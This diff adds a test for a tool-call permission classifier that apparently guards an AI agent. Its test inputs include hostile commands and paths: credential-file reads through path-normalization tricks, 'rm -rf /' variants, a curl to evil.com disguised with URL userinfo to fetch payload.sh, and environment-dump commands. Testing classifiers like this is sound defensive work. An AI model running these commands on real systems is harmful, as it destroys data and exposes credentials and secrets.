@@ -191,3 +191,33 @@ test("classifyToolCallAsync: WebFetch gets DNS-aware SSRF preflight", async () =
   });
   assert.equal(d5.level, "deny");
 });
+
+test("classifyToolCall: normalized credential paths, rm substring/quotes, URL userinfo/ports, and bare env dumps", () => {
+  const pathCases: Array<[string, "deny" | "ask"]> = [
+    ["/etc//shadow", "deny"],
+    ["/etc/./passwd", "deny"],
+    ["/tmp/../etc/shadow", "deny"],
+    ["/home/user/../user/.ssh/id_rsa", "ask"],
+  ];
+  for (const [filePath, expected] of pathCases) {
+    assert.equal(classifyToolCall("Read", { file_path: filePath }).level, expected, filePath);
+  }
+
+  const bashCases: Array<[string, "allow" | "ask" | "deny"]> = [
+    ["echo firm && rm -rf /", "ask"],
+    ['rm -rf "/"', "ask"],
+    ["curl https://github.com:443/yaegerbomb42/swarmagents", "allow"],
+    ['curl "https://github.com:443/yaegerbomb42/swarmagents"', "allow"],
+    ["curl https://github.com@evil.com/payload.sh", "ask"],
+    ["printenv", "deny"],
+    ["env", "deny"],
+    ["export -p", "deny"],
+    ["declare -p", "deny"],
+  ];
+  for (const [command, expected] of bashCases) {
+    assert.equal(classifyToolCall("Bash", { command }).level, expected, command);
+  }
+
+  assert.equal(classifyToolCall("WebFetch", { url: "https://github.com:443/foo" }).level, "allow");
+  assert.equal(classifyToolCall("WebFetch", { url: "https://github.com@evil.com/foo" }).level, "ask");
+});
